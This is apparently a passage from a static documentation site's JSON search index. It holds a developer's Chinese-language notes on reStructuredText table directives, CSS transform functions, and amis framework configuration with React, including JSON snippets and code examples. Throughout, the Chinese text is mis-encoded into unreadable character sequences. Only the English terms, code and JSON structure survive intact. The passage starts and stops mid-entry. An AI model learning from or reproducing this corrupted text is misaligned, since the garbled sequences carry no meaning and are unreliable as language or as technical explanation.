æ•ˆæœ Truth table for \"not\" A not A False True True False csv-table ä»¥csvï¼ˆé€—å·åˆ†éš”å€¼ï¼‰æ•°æ®çš„å½¢å¼å†™è¡¨æ ¼. æ”¯æŒå•å…ƒæ ¼å†…çš„å—æ ‡è®°å’Œå†…è”æ ‡è®°ã€‚çº¿ç«¯åœ¨å•å…ƒæ ¼ä¸­è¢«è¯†åˆ«ã€‚ ä¸æ”¯æŒæ£€æŸ¥æ¯è¡Œä¸­çš„åˆ—æ•°æ˜¯å¦ç›¸åŒã€‚è¯¥æŒ‡ä»¤ä¼šè‡ªåŠ¨åœ¨çŸ­è¡Œæœ«å°¾æ·»åŠ ç©ºæ¡ç›®ã€‚ æ”¯æŒå‘½ä»¤é€‰é¡¹: align: \"left\", \"center\", or \"right\" æ°´å¹³å¸ƒå±€æ–¹å¼ delim: char , \"tab\" , \"space\" è¡¨æ ¼åˆ—åˆ†éš”ç¬¦, é»˜è®¤é€—å·, å¯è‡ªå®šä¹‰ä¸ºå†’å·ç­‰ encoding: string è‹¥ä½¿ç”¨urlæˆ–è€…csvæ–‡ä»¶çš„æ•°æ®, ç”¨ä»€ä¹ˆç¼–ç è§£æ, é»˜è®¤ä½¿ç”¨æ–‡ä»¶è¾“å‡ºç¼–ç  escape: char å°†ä½¿ç”¨çš„åˆ†éš”ç¬¦è½¬ä¹‰ä¸ºæ™®é€šç¬¦å·, é»˜è®¤æ˜¯åŒå¼•å· å¦‚: ä¸€åˆ—(è¿™é‡ŒåŒåŒå¼•å·æœ€ç»ˆæ˜¯ä¸€å¯¹åŒå¼•å·) \"He said, \"\"Hi!\"\"\" ä¸¤åˆ—(åŒå¼•å·ä¸ä¼šè¢«è¾“å‡º) -M, \"move/rename a branch, even if target exists\" file: string (newlines removed) å¼•ç”¨æœ¬åœ°csvæ–‡ä»¶çš„è·¯å¾„ header: CSV data è¡¨æ ¼å¤´å®šä¹‰, éœ€è¦åœ¨ header-rows ä¹‹å‰ header-rows: integer é™¤äº†headerå®šä¹‰çš„è¡¨å¤´, æ•°æ®ä¸»ä½“è¿˜æœ‰å‡ è¡Œæ˜¯è¡¨å¤´, é»˜è®¤0. keepspace: flag (empty) å°†åˆ†éš”ç¬¦åé¢çš„ç©ºæ ¼è§†ä¸ºæ˜¾è‘—çš„(å°†ç©ºæ ¼è¾“å‡º)ã€‚é»˜è®¤æƒ…å†µä¸‹æ˜¯å¿½ç•¥æ­¤ç±»ç©ºæ ¼ã€‚ quote: char ä¸€ä¸ªå­—ç¬¦å­—ç¬¦ä¸²ï¼Œç”¨äºå¼•ç”¨åŒ…å«åˆ†éš”ç¬¦æˆ–ä»¥å¼•å·å­—ç¬¦å¼€å¤´çš„å…ƒç´ ã€‚é»˜è®¤ä¸º\"ï¼ˆå¼•ç”¨ï¼‰ã€‚å¯ä»¥æŒ‡å®šä¸ºUnicodeä»£ç ç‚¹ï¼›æœ‰å…³è¯­æ³•è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…unicodeæŒ‡ä»¤ã€‚ stub-columns: integer ç”¨ä½œå­˜æ ¹çš„è¡¨åˆ—æ•°é‡ï¼ˆå·¦ä¾§çš„è¡Œæ ‡é¢˜ï¼‰ã€‚é»˜è®¤ä¸º0ã€‚ url: string (whitespace removed) ä¸€ä¸ªCSVæ•°æ®è¡¨æ ¼çš„é“¾æ¥. widths: integer [integer...] or \"auto\" ç›¸å¯¹åˆ—å®½åº¦åˆ—è¡¨ã€‚é»˜è®¤å€¼ä¸ºç­‰å®½åº¦åˆ—ï¼ˆ100%/#columnsï¼‰ã€‚ \"auto\"å°†åˆ—å®½åº¦çš„ç¡®å®šå§”æ‰˜ç»™åç«¯ï¼ˆLaTeXï¼ŒHTMLæµè§ˆå™¨ï¼Œ...ï¼‰ã€‚ width: length or percentage å°†è¡¨çš„å®½åº¦è®¾ç½®ä¸ºæŒ‡å®šé•¿åº¦æˆ–è¡Œå®½åº¦çš„ç™¾åˆ†æ¯”ã€‚å¦‚æœçœç•¥ï¼Œæ¸²æŸ“å™¨å°†æ ¹æ®å…¶å†…å®¹æˆ–åˆ—å®½åº¦æ¥ç¡®å®šè¡¨çš„å®½åº¦ã€‚ è­¦å‘Š \"Csv-table\"æŒ‡ä»¤çš„\":file:\"å’Œ\":url:\"é€‰é¡¹ä»£è¡¨äº†æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚å®ƒä»¬å¯ä»¥é€šè¿‡\"file_insertion_enabled\"è¿è¡Œæ—¶è®¾ç½®ç¦ç”¨ã€‚ æºç : .. csv-table:: Frozen Delights! :header: \"Treat\", \"Quantity\", \"Description\" \"Treat2\", \"Quantity2\", \"Description2\" :widths: 15, 10, 30 :header-rows: 1 \"Albatross\", 2.99, \"On a stick!\" \"Crunchy Frog\", 1.49, \"If we took the bones out, it wouldn't be crunchy, now would it?\" \"Gannet Ripple\", 1.99, \"On a stick!\" æ•ˆæœ Frozen Delights! Treat Quantity Description Treat2 Quantity2 Description2 Albatross 2.99 On a stick! Crunchy Frog 1.49 If we took the bones out, it wouldn't be crunchy, now would it? Gannet Ripple 1.99 On a stick! list-table ä»¥åˆ—è¡¨çš„å½¢å¼åˆ›å»ºè¡¨æ ¼, æ³¨æ„ä¿æŒå…ƒç´ åˆ—ä¸€è‡´ æ”¯æŒçš„å‘½ä»¤é€‰é¡¹: align: \"left\", \"center\", or \"right\" æ°´å¹³å¯¹å…¶æ–¹å¼ header-rows: integer è¡¨å¤´è¡Œæ•° stub-columns: integer ç”¨ä½œå­˜æ ¹çš„è¡¨åˆ—æ•°é‡ï¼ˆå·¦ä¾§çš„è¡Œæ ‡é¢˜ï¼‰ã€‚é»˜è®¤ä¸º0ã€‚ width: length or percentage å°†è¡¨çš„å®½åº¦è®¾ç½®ä¸ºæŒ‡å®šé•¿åº¦æˆ–è¡Œå®½åº¦çš„ç™¾åˆ†æ¯”ã€‚å¦‚æœçœç•¥ï¼Œæ¸²æŸ“å™¨å°†æ ¹æ®å…¶å†…å®¹æˆ–åˆ—å®½åº¦æ¥ç¡®å®šè¡¨çš„å®½åº¦ã€‚ widths: integer [integer...] or \"auto\" ç›¸å¯¹åˆ—å®½åº¦åˆ—è¡¨ã€‚é»˜è®¤å€¼ä¸ºç­‰å®½åº¦åˆ—ï¼ˆ100%/#columnsï¼‰ã€‚ \"auto\"å°†åˆ—å®½åº¦çš„ç¡®å®šå§”æ‰˜ç»™åç«¯ï¼ˆLaTeXï¼ŒHTMLæµè§ˆå™¨ï¼Œ...ï¼‰ã€‚ æºç : .. list-table:: Frozen Delights! :widths: 15 10 30 :header-rows: 1 :stub-columns: 1 * - Treat - Quantity - Description * - Albatross - 2.99 - On a stick! * - Crunchy Frog - 1.49 - If we took the bones out, it wouldn't be crunchy, now would it? * - Gannet Ripple - 1.99 - On a stick! æ•ˆæœ Frozen Delights! Treat Quantity Description Albatross 2.99 On a stick! Crunchy Frog 1.49 If we took the bones out, it wouldn't be crunchy, now would it? Gannet Ripple 1.99 On a stick!","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-tables.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-tables.html"},{"title":"è¡¨æ ¼","text":"æ”¯æŒçš„æŒ‡ä»¤ table csv-table list-table ç¬¦å·è¡¨æ ¼ table ç®€å•è¡¨æ ¼, ä¾‹: .. table:: ä¸€ä¸ªæµ‹è¯•è¡¨æ ¼ :name: csvè¡¨æ ¼ ====== ======== ======== head 1 2 ====== ======== ======== 1 2 3 2 3 4 3 4 5 ====== ======== ======== æ³¨è§£ ç®€å•è¡¨æ ¼å¯ä»¥ä¸éœ€è¦ ..table , ç›´æ¥ä½¿ç”¨ç¬¦å·ç”»å‡ºæ¥å¯ä»¥è‡ªåŠ¨è¯†åˆ« csv-table csvæ•°æ®è¡¨æ ¼, æ”¯æŒè‡ªå®šä¹‰åˆ†éš”ç¬¦, ä¾‹: .. csv-table:: ä¸€ä¸ªæµ‹è¯•è¡¨æ ¼ :name: ä¸çŸ¥é“æœ‰å•¥ç”¨ :header: head, 1, 2 1, 2, 3 2, 3, 4 3, 4, 5 list-table åˆ—è¡¨æ ¼å¼è¡¨æ ¼: .. list-table:: ä¸€ä¸ªæµ‹è¯•è¡¨æ ¼ :name: test_listè¡¨æ ¼ :header-rows: 1 * - head - 1 - 2 * - 1 - 2 - 3 * - 2 - 3 - 4 * - 3 - 4 - 5 ç¬¦å·è¡¨æ ¼ æˆ‘è¿™æ ·ç§°, æ²¡æ³¨æ„å®˜æ–¹æ€ä¹ˆå®šä¹‰. æºç : +-------+-------+-------+ | head1 | head2 | head3 | +=======+=======+=======+ | 1 | 2 | 3 | +-------+-------+-------+ | 4 | 5 | 6 | +-------+-------+-------+ | 7 | 8 | 9 | +-------+-------+-------+ æ•ˆæœåŸºæœ¬éƒ½æ˜¯ä¸€æ ·çš„: head1 head2 head3 1 2 3 2 3 4 3 4 5 æ³¨è§£ è¿™ç§ç¬¦å·è¡¨æ ¼, åªèƒ½ç”¨ç©ºæ ¼è€Œä¸æ˜¯tab, å¦åˆ™ä¼šå¯¼è‡´è¯†åˆ«ä¸æ­£å¸¸(æˆªæ­¢äºSphinx5.3, åç»­æ²¡è¯•è¿‡) å¦å¤–ç¬¦å·è¡¨æ ¼ç”»èµ·æ¥å¥½éº»çƒ¦ è¡¨æ ¼æŠ˜è¡Œæ‰“å° æœ‰æ—¶å€™æ–‡å­—å¤ªé•¿, éœ€è¦æŠ˜è¡Œè§†ä¸ºåŒä¸€è¡Œ ç®€å•è¡¨æ ¼åªèƒ½å®ç°ç¬¬äºŒåˆ—åçš„æŠ˜è¡Œ åˆå¹¶ä¹Ÿæ”¯æŒ æ•ˆæœ: hd 1 2 1 2 889 5 456 2 3 6 3 4 7 æºç  ä¹Ÿæ”¯æŒè¡¨æ ¼åˆå¹¶ åˆå¹¶è¡¨æ ¼ä½“ç¬¬äºŒè¡Œ: hd 1 2 1 2 889 5 456 2 3 6 3 4 7 æºç : æ­¤å¤„å‚è€ƒ: è¡¨æ ¼å­¦ä¹  ç¬¦å·è¡¨æ ¼å¯ä»¥å®ç°æ‰€æœ‰åˆ—çš„æŠ˜è¡Œ head1 head2 head3 1 4 2 24 3 34 2 3 4 3 4 5","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-sheet.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-sheet.html"},{"title":"transform","text":"å…è®¸ä½ æ—‹è½¬ï¼Œç¼©æ”¾ï¼Œå€¾æ–œæˆ–å¹³ç§»ç»™å®šå…ƒç´ (åŒ…æ‹¬2D/3D)ã€‚è¿™æ˜¯é€šè¿‡ä¿®æ”¹ CSS è§†è§‰æ ¼å¼åŒ–æ¨¡å‹çš„åæ ‡ç©ºé—´æ¥å®ç°çš„ã€‚ ç¤ºä¾‹: https://developer.mozilla.org/zh-CN/docs/Web/CSS/transform è¯´æ˜: https://www.w3school.com.cn/cssref/pr_transform.asp å¸¸è§çš„ transform å±æ€§å€¼åŠå…¶ä½œç”¨ å¹³ç§»ï¼ˆTranslateï¼‰ translate() å‡½æ•°ç”¨äºåœ¨æ°´å¹³å’Œå‚ç›´æ–¹å‘ä¸Šå¹³ç§»å…ƒç´ : transform: translate(100px, 50px); ä¸Šè¿°ä»£ç å°†æŠŠå…ƒç´ å‘å³å¹³ç§» 100 åƒç´ ï¼Œå‘ä¸‹å¹³ç§» 50 åƒç´ ã€‚ æ—‹è½¬ï¼ˆRotateï¼‰ rotate() å‡½æ•°ç”¨äºæŒ‰æŒ‡å®šè§’åº¦æ—‹è½¬å…ƒç´ : transform: rotate(45deg); ä¸Šè¿°ä»£ç å°†å…ƒç´ é¡ºæ—¶é’ˆæ—‹è½¬ 45 åº¦ã€‚ ç¼©æ”¾ï¼ˆScaleï¼‰ scale() å‡½æ•°ç”¨äºæŒ‰æŒ‡å®šæ¯”ä¾‹ç¼©æ”¾å…ƒç´ : transform: scale(1.5); ä¸Šè¿°ä»£ç å°†å…ƒç´ çš„å°ºå¯¸æ”¾å¤§åˆ°åŸå§‹å°ºå¯¸çš„ 1.5 å€ã€‚ æ”¯æŒä¸åŒæ–¹å‘çš„ç¼©æ”¾, æ¯”å¦‚ä»…ç¼©æ”¾é«˜åº¦: transform: scaleY(1.5); å€¾æ–œï¼ˆSkewï¼‰ skew() å‡½æ•°ç”¨äºæŒ‰æŒ‡å®šè§’åº¦å€¾æ–œå…ƒç´ : transform: skew(30deg, -10deg); ä¸Šè¿°ä»£ç å°†å…ƒç´ æ°´å¹³æ–¹å‘å€¾æ–œ 30 åº¦ï¼Œå‚ç›´æ–¹å‘å€¾æ–œ -10 åº¦ã€‚ å…¶ä»– çŸ©é˜µå˜æ¢ï¼ˆmatrix()ï¼‰ã€é€è§†æ•ˆæœï¼ˆperspective()ï¼‰","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-transform.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-transform.html"},{"title":"è°ƒç”¨å…¶ä»–ç»„ä»¶","text":"æ¯”å¦‚è°ƒç”¨Formçš„submit, åœ¨actionä¸­å®šä¹‰: { \"type\": \"action\", \"label\": \"æäº¤è¡¨å•\", \"level\": \"primary\", \"className\": \"mr-3 mb-3\", \"onEvent\": { \"click\": { \"actions\": [ { \"actionType\": \"submit\", \"componentId\": \"form-action-receiver\" } ] } } }, å…¶ä¸­, \"componentId\": \"form-action-receiver\" è¡¨ç¤ºéœ€è¦åœ¨formä¸­å®šä¹‰id: id: \"form-action-receiver\" formæ”¯æŒçš„è¡Œä¸º: https://aisuda.bce.baidu.com/amis/zh-CN/components/form /index#åŠ¨ä½œè¡¨ æ³¨è§£ å¦‚æœè¦åŒæ—¶å®šä¹‰å¤šä¸ªaction, å¯ä»¥ä½¿ç”¨actionsä¸²è¡Œåˆ—è¡¨. å¦‚dialogçš„onEvent: type: \"dialog\", ... onEvent: { confirm: { actions: [ { actionType: 'setValue', componentId: \"top-form\", args: { value: { envD: '${ENCODEJSON(envDD)}', envDD: '${envDD}', eName: 'x${eName}' } } }, { actionType: 'setValue', componentId: \"dis-data\", args: { value: { envD: '${ENCODEJSON(envDD)}', envDD: 'x${envDD}', eName: 'x${eName}' } } }, { actionType: 'custom', script: (context: any, doAction: any, event: any) => { console.log(context) } } ] } } æœ€åçš„ custom å±äº è‡ªå®šä¹‰JS è§: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/event-action#è‡ªå®šä¹‰-js","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-Call-other-components.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Call-other-components.html"},{"title":"è°ƒç”¨æœ¬åœ°è‡ªå®šä¹‰å‡½æ•°","text":"è¿™ä¸ªæ˜¯ä¸ªå‘, å®˜ç½‘æ–‡æ¡£åªæäº†ä¸€å¥ Button , ä¸”ä¸æ”¯æŒå®Œå…¨è‡ªå®šä¹‰å‚æ•°, å…¶ä»–æ§ä»¶æ¯”å¦‚ Dialog çš„å®Œå…¨ä¸çŸ¥é“æ€ä¹ˆç”¨ æ¯”å¦‚ button çš„ç‚¹å‡»äº‹ä»¶, onClick ç›´æ¥ç»™å‡½æ•°å¼•ç”¨: { \"type\": \"page\", \"body\": [ { \"type\": \"button\", \"label\": \"è°ƒç”¨æœ¬åœ°å‡½æ•°\", \"onClick\": this._handleUpdate, } ] } åˆæ¯”å¦‚ dialog çš„ onConfirm dialog: { onConfirm: this._handleUpdate, type: 'dialog', data: { envData: { 5: 9, } }, body: [ { \"type\": \"input-kv\", \"name\": \"envData\", } ] } Button çš„å‚æ•°åˆ—è¡¨ä¸º (event, props) , å¯ä»¥é€šè¿‡ props.data è®¿é—®åˆ°æ•°æ®åŸŸçš„å†…å®¹.","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-Call-the-local-custom-function.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Call-the-local-custom-function.html"},{"title":"comboæ— æ³•æŒ‡å®šæ›´æ–°æŸä¸€ä¸ª","text":"ç¬¬ä¸€æ¬¡é‡åˆ°æ˜¯ä½¿ç”¨ input-array , æ•°ç»„çš„æ¯ä¸€ä¸ªé¡¹æœ‰å¤šä¸ªæŒ‡å®šçš„å€¼, æŒ‡å®šé¡¹idå¹¶ä½¿ç”¨ componentId , ä¼šé€ æˆåªèƒ½æ›´æ–°ç¬¬ä¸€ä¸ªé¡¹çš„æ•°æ®, å³ä½¿æ˜¯ç”±å…¶ä»–é¡¹è§¦å‘. è¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨ componentName æŒ‡å®šå½“å‰é¡¹çš„name, ä¼šè‡ªåŠ¨å¤„ç† å®æµ‹ä½¿ç”¨å®˜ç½‘æçš„ this.index æ— æ•ˆ: https://aisuda.bce.baidu.com/amis/zh-CN/components/form/combo#è®¾ç½®åºå·","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-Combo-cannot-specify-a-certain-update.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Combo-cannot-specify-a-certain-update.html"},{"title":"ä¸Reactç»“åˆä½¿ç”¨çš„æ•°æ®æ›´æ–°","text":"è¿™ä¸ªç®—æ˜¯ä¸€ä¸ªå°å‘, React çš„æ•°æ®åŸŸ, å‘æ¥éƒ½æ˜¯é€šè¿‡ state æ¥æ§åˆ¶æ¸²æŸ“. åŸä»¥ä¸º amis å·²ç»å†…ç½®å¤„ç†äº†è¿™ä¸ªé—®é¢˜, ç»“æœæ²¡æœ‰, è¿˜æ˜¯å¾— state å‡ºé©¬: import {render as renderAmis} from 'amis'; export class MyComponent extends React.Component<any, any> { state = { _envData: { 1: 5, 2: 6, } } render(){ return ( <div> {renderAmis( { type: 'page', title: 'ç®€å•é¡µé¢', data: { envData: this.state._envData, }, body: [...] } )} </div> ) } }","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-Data-update-used-with-React.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Data-update-used-with-React.html"},{"title":"dialogæ›´æ–°çˆ¶ç»„ä»¶æ•°æ®åŸŸ","text":"ä¸€èˆ¬æ¥è¯´æœ‰ä¸¤ç§æ–¹æ¡ˆ æ–¹æ¡ˆä¸€: å¦‚æœä½¿ç”¨çš„æ˜¯API, åœ¨dialogä¸Šå¢åŠ ä¸€ä¸ªæ•°æ®æ›´æ–°çš„APIå³å¯, å¤–éƒ¨ä¹Ÿéœ€è¦æœ‰æŸ¥è¯¢çš„API æ–¹æ¡ˆäºŒ: ä½¿ç”¨dialogæä¾›çš„ setValue , å¯ä»¥æŒ‡å®šæ›´æ–°æŸä½ç½®çš„æ•°æ®åŸŸ, éœ€è¦æå‰ä½¿ç”¨idæŒ‡å®šä½ç½®: { type: \"service\", data: { envData: this.state._envData, eName: 'tt' }, body: [ { type: 'grid', columns: [ { type: 'form', id: 'top-form', body: [ { type: 'input-text', name: 'eName', label: 'label0', mode: \"horizontal\", }, { type: 'flex', style: { width: '100%', height: '100%', justifyContext: 'flex-end', flexDirection: 'column' }, items: [ { icon: 'fas fa-list-ul', type: 'button', actionType: 'dialog', dialog: { type: 'dialog', body: [ { type: \"input-kv\", name: \"envData\", }, { type: 'input-text', label: \"name${eName}\", name: 'eName', } ], onEvent: { confirm: { actions: [ { actionType: 'setValue', componentId: \"top-form\", args: { value: { eName: 'x${eName}' } } } ] } } } }, ] }, ] }, ] }, ] }, ä¸»è¦çš„, å®šä¹‰id: id: 'top-form', å®šä¹‰æ‰§è¡Œæ›´æ–°æ—¶å€™çš„æ•°æ®: onEvent: { confirm: { actions: [ { actionType: 'setValue', componentId: \"top-form\", args: { value: { eName: 'x${eName}' } } } ] } } æ³¨æ„, è²Œä¼¼åªèƒ½æ›´æ–°æŸä¸€æ¡æ•°æ®é“¾ä¸Šçš„å†…å®¹ é»˜è®¤setValueä¼šå°†æ–°æ•°æ®ä¸ç›®æ ‡ç»„ä»¶æ•°æ®è¿›è¡Œåˆå¹¶; å¯ä»¥é€šè¿‡\"dataMergeMode\": \"override\"æ¥è¦†ç›–ç›®æ ‡ç»„ä»¶æ•°æ®; é™¤éæ˜¯å½“å‰æ•°æ®é“¾ä¸Šçš„æ•°æ®, å¦åˆ™éœ€è¦æŒ‡å®šé¢å¤–çš„idå»æ›´æ–°æŒ‡å®šæ§ä»¶çš„æ•°æ®","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-Dialog-update-parent-component-data-domain.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Dialog-update-parent-component-data-domain.html"},{"title":"ç±»disabledå±æ€§åªèƒ½è¯†åˆ«æ•°æ®é“¾å¯¹è±¡","text":"æ¯”å¦‚æœ‰ä¸€ä¸ª checkbox æ§ä»¶ name ä¸º: com.app.enable { \"type\": \"checkbox\", \"name\": \"com.app.enable\" } åŒæ—¶æœ‰ä¸€ä¸ªç›¸å…³çš„ input-text æ§ä»¶çš„ disabledOn å±æ€§ä¸å…¶ç›¸å…³è”: { \"type\": \"input-text\", \"name\": \"com.app.version\" \"disabledOn\": \"${!com.app.enable}\" } è¡¨ç¤ºåªæœ‰ checkbox é€‰æ‹©çš„æ—¶å€™ text æ‰å¯ç”¨ ä½†æ˜¯å› ä¸ºå±æ€§æ˜¯åŒ…å« . çš„, æ‰€ä»¥å†…éƒ¨é»˜è®¤ä¼šè¯†åˆ«ä¸º(æ•°æ®å—1): { com: { app: { version: \"\", enable: \"\", } } } å…¶ä¸­, ç»„ä»¶çš„ name å¯ä»¥è‡ªåŠ¨è¯†åˆ«ç›´æ¥ç»™çš„é“¾å¼æ•°æ®(æ•°æ®å—2): {\"com.app.enable\": false} è€Œç»„ä»¶çš„ disabledOn åªèƒ½è¯†åˆ«è§£æåçš„æ•°æ®, ä¹Ÿå°±æ˜¯åªèƒ½è¯†åˆ« (æ•°æ®å—1), æ•ˆæœå°±æ˜¯, å½“ disabledOn åŒ…å«ç‚¹æ—¶å€™, ç¬¬ä¸€æ¬¡ä½¿ç”¨æ²¡é—®é¢˜, ä½†æ˜¯å½“æ•°æ®åŸŸå·²æœ‰ (æ•°æ®å—2) å½¢å¼æ•°æ®æ—¶, disabledOn å±æ€§å°†å¤±æ•ˆ å¾—å°†ç‚¹æ›¿æ¢ä¸ºå…¶å®ƒæ‰èƒ½ä¿è¯æ­£å¸¸ä½¿ç”¨. æ³¨è§£ è¿™ä¸ªé—®é¢˜è§¦å‘çš„è°ƒæ•™è²Œä¼¼æ¯”è¾ƒè‹›åˆ», ç›®å‰åªåœ¨ä½¿ç”¨ apiInit çš„æ—¶å€™é‡åˆ°è¿‡ è¿˜æœ‰ä¸€ç‚¹, å¥½åƒæ˜¯æ¨¡ç‰ˆè¯­æ³•è¿˜æ˜¯å•¥, æ”¯æŒä½¿ç”¨this, æ¯”å¦‚æœ‰æ•°æ®åŸŸ: data: { isOne: true } disabledOnæ”¯æŒç›´æ¥è®¾ç½®ä¸º: disabledOn: \"!this.isOne\" ä½†æ˜¯ æ•°æ®åŸŸé‡Œä¸èƒ½è¿™æ ·ç”¨ , æ¯”å¦‚: type: \"select\", source: { url: \"xxx/xxx/xxx?a=${a}\", data: { a: \"this.a\" } }","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-Disabled-attributes-can-only-identify-data-chain-objects.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Disabled-attributes-can-only-identify-data-chain-objects.html"},{"title":"disabledOn è¡¨è¾¾å¼å¦‚æœåŒ…å«æœ‰ æ¨ªæ  - æ—¶ä¼šæ— æ•ˆ","text":"æå‡ºäº https://github.com/baidu/amis/issues/9673 åŸæ¥æ˜¯ - ä¼šè¢«å½“ä½œ å‡å· , éœ€è¦è½¬ä¹‰å¤„ç†: { \"type\": \"checkbox\", \"name\": \"_enableEnvAll-bob\", \"label\": \"å¯ç”¨\", // \"mode\": \"horizontal\", style: { justifyContent: 'center' }, }, { type: \"input-text\", name: \"_enableEnvAll-bob\", disabledOn: \"${!_enableEnvAll\\\\-bob}\", },","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-Disabledon-expression-If-it-contains-horizontal-bar--it-will-be-invalid.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Disabledon-expression-If-it-contains-horizontal-bar--it-will-be-invalid.html"},{"title":"input-kvè¯´æ˜","text":"ä¸ /docs/å‰ç«¯/æ¡†æ¶/amis/é—®é¢˜/input-textè¯´æ˜ ä¸ä¸€æ ·, input-kvåªèƒ½æ¥å— JSON æ•°æ®","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-Input-KV-description.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Input-KV-description.html"},{"title":"input-arrayä½¿ç”¨","text":"å¿…é¡»æœ‰ item , ç»„ä»¶æ‰çŸ¥é“æ€ä¹ˆæ¸²æŸ“: { type: 'input-array', items: { type: 'input-text' } } å¦‚æœæ˜¯å¤šä¸ªé¡¹ä½œä¸ºä¸€ä¸ªç»„, é‚£ä¹ˆéœ€è¦ä½¿ç”¨ combo : { type: 'input-array', items: { type: 'combo', controls: [ { type: 'input-text', name: 'va', label: 'va', }, { type: 'input-text', name: 'vb', label: 'vb', } ] } } è¿™æ—¶æ•°æ®çš„å®šä¹‰: eaa: [ {va: 1, vb: 11}, ] æ³¨è§£ å¦‚æœåœ¨ input-array å†…éƒ¨å®šä¹‰äº†å­ç»„ä»¶, é‚£ä¹ˆåœ¨è¿™é‡Œé¢å¾— componentId , componentName å¯èƒ½åªèƒ½è°ƒç”¨åˆ°å†…éƒ¨çš„ç»„ä»¶, å¦‚æœæ˜¯å¤–éƒ¨ç»„ä»¶å¤šåŠå°±æ˜¯æ‰¾ä¸åˆ°ç»„ä»¶ åˆ—è¡¨é•¿åº¦äº¤äº’ å½“åˆ—è¡¨æ•°æ®å¤§äºç­‰äº1æ—¶, ç¦æ­¢æ–°å¢: { type: 'input-array', name: 'array1', label: 'é•¿åº¦: ${COUNT(array1)}', addableOn: '${COUNT(array1) < 1}', items: {...} } æ³¨è§£ ä¸çŸ¥é“ä¸ºä»€ä¹ˆ, å®˜ç½‘æ–‡æ¡£æ²¡æœ‰æåˆ°å¯ä»¥ç”¨ addableOn, åªå†™äº† addable","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-Input-Rray-use.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Input-Rray-use.html"},{"title":"input-textè¯´æ˜","text":"input-textæ¥å—çš„æ•°æ®, å¦‚æœæ˜¯JSONæ ¼å¼, ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºå­—ç¬¦ä¸²å±•ç¤º, åŒæ—¶åœ¨æ­¤å¤„æ‰€æœ‰çš„æ›´æ”¹, ä¹Ÿä¼šè‡ªåŠ¨å˜æ¢åŸæ¥çš„JSONæ ¼å¼(å‰ææ˜¯æ ¼å¼æ­£ç¡®) æ³¨è§£ ä½†æ˜¯, ä¼°è®¡ä¹Ÿæ˜¯textåŸå› , ä½¿ç”¨APIæäº¤çš„æ—¶å€™è¿˜æ˜¯ä¼šæ˜¯å­—ç¬¦ä¸²å½¢å¼, å‘","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-Input-Text-description.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-Input-Text-description.html"},{"title":"æ¸²æŸ“ç•Œé¢æ— æ ·å¼","text":"æ³¨æ„éœ€è¦å¯¼å…¥å†…ç½®çš„CSSæ‰æœ‰æ ·å¼: import 'amis/lib/themes/cxd.css'; import 'amis/lib/helper.css'; import 'amis/sdk/iconfont.css'; // æˆ– import 'amis/lib/themes/antd.css'; å¦‚æœæ˜¯html, è¿™æ ·å¼•å…¥: <link href=\"./node_modules/amis/lib/themes/cxd.css\" /> <link href=\"./node_modules/amis/lib/helper.css\" /> <link href=\"./node_modules/amis/sdk/iconfont.css\" /> <!-- æˆ– <link href=\"./node_modules/amis/lib/themes/antd.css\" /> -->","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-No-style-of-rendering-interface.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-No-style-of-rendering-interface.html"},{"title":"Reactä½¿ç”¨","text":"é™¤äº†ç”¨json, åœ¨ React ç¯å¢ƒä¸‹ä½¿ç”¨ amisï¼Œè¿˜å¯ä»¥ç›´æ¥å¼•å…¥ amis å†…ç½®ç»„ä»¶ï¼Œ åœ¨ amis é¡¹ç›®æºç  src/components ä¸‹çš„ç»„ä»¶éƒ½æ˜¯æ ‡å‡† React ç»„ä»¶ï¼Œ å¯ä»¥åœ¨é¡¹ç›®ä¸­ç›´æ¥å¼•ç”¨ï¼Œè¿™æ ·å°±èƒ½å°† amis å½“æˆçº¯ç²¹ UI åº“æ¥ä½¿ç”¨: import {Button} from 'amis-ui'; ... <Button onClick={() => {}} type=\"button\" level=\"link\" className=\"navbar-btn\" > æŒ‰é’® </Button>","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-question-React.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-React.html"},{"title":"è®¾ç½®å…¶ä»–ç»„ä»¶çš„å€¼","text":"æœ€ç®€å•çš„, ç›´æ¥ä½¿ç”¨ value å³å¯: { type: \"input-text\", name: \"input_v2\", }, { type: \"input-text\", name: \"input_v\", value: \"${input_v2}\" }, input_v2æ›´æ–°ä¼šè‡ªåŠ¨æ›´æ–°input_v æˆ–è€…ç”¨onChangeåªèƒ½è¿™æ 